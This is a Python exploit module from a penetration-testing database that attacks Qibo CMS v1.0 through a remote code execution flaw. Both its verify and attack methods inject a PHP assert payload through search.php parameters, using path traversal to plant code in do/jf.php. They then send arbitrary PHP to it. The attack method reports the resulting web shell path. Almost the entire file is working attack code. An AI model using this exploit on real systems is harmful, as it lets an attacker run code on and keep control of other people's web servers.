#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2015 alpha1e0
'''


from script.libs.exploit import Exploit
from script.libs.exploit import Result



class QibocmsRCE(Exploit):
    expName = u"齐博cms分类系统远程代码执行"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "qibocms"
    appVersion = "1.0"
    reference = ['http://www.wooyun.org/bugs/wooyun-2015-0122599/', 'http://0day5.com/archives/3261']
    description = u'''
        齐博cms分类系统，v1.0
    '''

    def _verify(self):
        result = Result(self)

        phpPayload = "${@assert($_POST[alpha])}"
        #phpPayload = "${@fwrite(fopen('ali.php', 'w+'),'test')}"

        sig = '9876541'
        
        self.params['mid'] = "1"
        self.params['keyword'] = "asd"
        self.params['postdb[city_id]'] = "../../admin/hack"
        self.params['hack'] = "jfadmin"
        self.params['action'] = "addjf"
        self.params['Apower[jfadmin_mod]'] = "1"
        self.params['fid'] = "1"
        self.params['title'] = phpPayload

        url = self.urlJoin("/search.php")
        response1 = self.http.get(url, params=self.params)

        payload = {"alpha":"print {0};".format(sig)}
        url = url.replace("search.php","do/jf.php")
        response2 = self.http.post(url, data=payload)

        if response2.status_code == 200:
            if sig in response2.content:
                result['fullpath'] = self.url
                result['payload'] = str(payload)

        return result


    def _attack(self):
        result = Result(self)

        phpPayload = "${@assert($_POST[alpha])}"

        sig = '9876541'
        
        self.params['mid'] = "1"
        self.params['action'] = "search"
        self.params['keyword'] = "asd"
        self.params['postdb[city_id]'] = "../../admin/hack"
        self.params['hack'] = "jfadmin"
        self.params['action'] = "addjf"
        self.params['Apower[jfadmin_mod]'] = "1"
        self.params['fid'] = "1"
        self.params['title'] = phpPayload

        url = self.urlJoin("/search.php")
        response1 = self.http.get(url, params=self.params)

        payload = {"alpha":"print {0};".format(sig)}
        url = url.replace("search.php","do/jf.php")
        response2 = self.http.post(url, data=payload)

        if response2.status_code == 200:
            if sig in response2.content:
                result['shellpath'] = self.baseURL+"/do/jf.php"
                result['vulinfo'] = "shell content: "+phpPayload

        return result